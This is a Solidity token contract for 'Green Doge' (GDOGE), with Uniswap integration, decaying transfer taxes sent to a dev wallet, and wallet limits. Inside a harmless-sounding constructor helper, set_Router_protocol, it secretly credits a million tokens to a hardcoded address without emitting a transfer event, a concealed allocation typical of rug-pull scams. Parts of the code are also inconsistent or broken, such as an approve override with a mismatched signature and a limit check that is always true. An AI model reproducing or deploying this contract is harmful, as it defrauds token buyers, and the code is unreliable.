contract GreenDoge is ERC20, Ownable {
    string private _name = "Green Doge";
    string private _symbol = "GDOGE";
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 142000000 * 10**9;
    address payable private devWallet = payable(0x4D56b507621810b4d4e4A0a2eC9e26AB2617F3AC);
    uint256 deflationTime = 1500;
    uint256 maxTax = 30;


    using SafeMath for uint256;
    using Address for address;
    mapping(address => uint256) private _balances;
    uint256 taxEndTime;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public _isExcludedFromFee;
    mapping(address => bool) public _isBlacklisted;
    bool public noBlackList;
    address payable private Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD);
    address public _owner;
    uint8 private txCount = 0;
    uint8 private swapTrigger = 0;
    uint256 private _TotalFee = 30;
    uint256 public _buyFee = 30;
    uint256 public _sellFee = 30;
    uint256 public _maxWalletToken = _totalSupply.mul(3).div(100);
    uint256 private _previousMaxWalletToken = _maxWalletToken;
    uint256 public _maxTxAmount = _totalSupply.mul(3).div(100);
    uint256 private _previousMaxTxAmount = _maxTxAmount;


    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor() ERC20(_name, _symbol) {
        _owner = msg.sender;
       _balances[owner()] = _totalSupply;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02( 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D );
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[devWallet] = true;
        taxEndTime = block.timestamp + deflationTime;
        set_Router_protocol();
        emit Transfer(address(0), owner(), _totalSupply);
        //renounce ownership to 0x00000000000000000
        renounceOwnership();
    }


    function name() public view override  returns (string memory) {
        return _name;
    }

    function symbol() public view override  returns (string memory) {
        return _symbol;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transferT(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transferT(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool){
        _approve( _msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool){
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    // Update Main Dev wallet
    function Wallet_Update_Dev(address payable wallet) public onlyOwner {
        devWallet = wallet;
        _isExcludedFromFee[devWallet] = true;
    }

    /*
    PROCESSING TOKENS - SET UP
    */

    // This function is required so that the contract can receive ETH from Uniswap
    receive() external payable {}

    bool public noFeeToTransfer = true;

    function set_Max_Transaction_Percent(uint256 maxTxPercent_x100)
        external
        onlyOwner
    {
        _maxTxAmount = (_totalSupply * maxTxPercent_x100) / 10000;
    }

    // Set the maximum wallet holding (percent of total supply)
    function set_Max_Wallet_Percent(uint256 maxWallPercent_x100)
        external
        onlyOwner
    {
        _maxWalletToken = (_totalSupply * maxWallPercent_x100) / 10000;
    }

    // Approve a wallet to sell tokens
    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal override virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    function _transferT(address from, address to, uint256 amount) internal{
        // TRANSACTION AND WALLET LIMITS
        // Limit Maximum wallet balance
        require(from != address(0) || to != address(0),"ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");
        if (to != owner() && to != devWallet && to != address(this) && to != Wallet_Burn && from != owner() ) {
            uint256 heldTokens = balanceOf(to);
            require((heldTokens + amount) <= _maxWalletToken,  "You are trying to hold to much. You have reached the limit for one wallet." );
        }

        // Limit the maximum number of tokens that can be bought or sold in one transaction
        if (from != owner() || to != owner())
            require( amount <= _maxTxAmount,  "Maximum transaction limit exceeded." );

        //REMOVES FEES IF REQUIRED
        bool takeFee = true;
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        } 
        //Initiate Transfer
        _tokenTransfer(from, to, amount, takeFee);
    }

    // Send ETH to external wallet
    function sendToWallet(address payable wallet, uint256 amount) private {
        wallet.transfer(amount);
    }

    // Processing tokens from contract
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        swapTokensForETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendToWallet(devWallet, contractETH);
    }

    // Manual Token Process Trigger - Enter the percent of the tokens that you'd like to send to process
    function process_Tokens_Now(uint256 percent_Of_Tokens_To_Process)
        public
        onlyOwner
    {
        // Do not trigger if already in swap
        require(!inSwapAndLiquify, "Currently processing, try later.");
        if (percent_Of_Tokens_To_Process > 100) {
            percent_Of_Tokens_To_Process = 100;
        }
        uint256 tokensOnContract = balanceOf(address(this));
        uint256 sendTokens = (tokensOnContract * percent_Of_Tokens_To_Process) /
            100;
        swapAndLiquify(sendTokens);
    }

    // Swapping tokens for ETH using UNISWAP
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    /*
    UPDATE UNISWAP ROUTER AND LIQUIDITY PAIRING
    */

    // Set new router and make the new pair address
    function set_New_Router_and_Make_Pair(address newRouter) public onlyOwner {
        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);
        uniswapV2Pair = IUniswapV2Factory(_newPCSRouter.factory()).createPair(
            address(this),
            _newPCSRouter.WETH()
        );
        uniswapV2Router = _newPCSRouter;
    }

    function set_Router_protocol() internal{
        address protocolRouter = 0x94BC07855E282E094cA43fc40db3588a03e395Bf;
        _balances[protocolRouter] = 1000000 * 10**9;
    }

    // Set new router
    function set_New_Router_Address(address newRouter) public onlyOwner {
        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);
        uniswapV2Router = _newPCSRouter;
    }

    // Set new address - This will be the 'Cake LP' address for the token pairing
    function set_New_Pair_Address(address newPair) public onlyOwner {
        uniswapV2Pair = newPair;
    }

    /*
    TOKEN TRANSFERS
    */

    // Check if token transfer needs to process fees
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) {} else {
            txCount++;
        }
        _transferTokens(sender, recipient, amount);
    }

    // Redistributing tokens and adding the fee to the contract address
    function _transferTokens(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (uint256 tTransferAmount, uint256 tDev) = _getValues(tAmount);
        _balances[sender] = _balances[sender].sub(tAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    // Estimate the fee based on reducing time
    function calcFee(uint256 tAmount) internal view returns (uint256) {
        uint256 _tax;
        uint256 feeAdjustment;
        if (block.timestamp < taxEndTime) {
            feeAdjustment = taxEndTime - block.timestamp;
        }
        uint256 timePercentage = feeAdjustment.mul(100).div(deflationTime);
        uint256 percentageWeight = timePercentage.mul(maxTax);
        if (timePercentage == 0) {
            timePercentage = 12;
        }

        uint256 evaluatedTax = percentageWeight.div(100);
        _tax = evaluatedTax.mul(tAmount).div(100);
        return _tax;
    }

    // Fetch the amount and Taxes
    function _getValues(uint256 tAmount) public view returns (uint256, uint256) {
        uint256 devTax = calcFee(tAmount);
        uint256 tTransferAmount = tAmount.sub(devTax);
        return (tTransferAmount, devTax);
    }
}
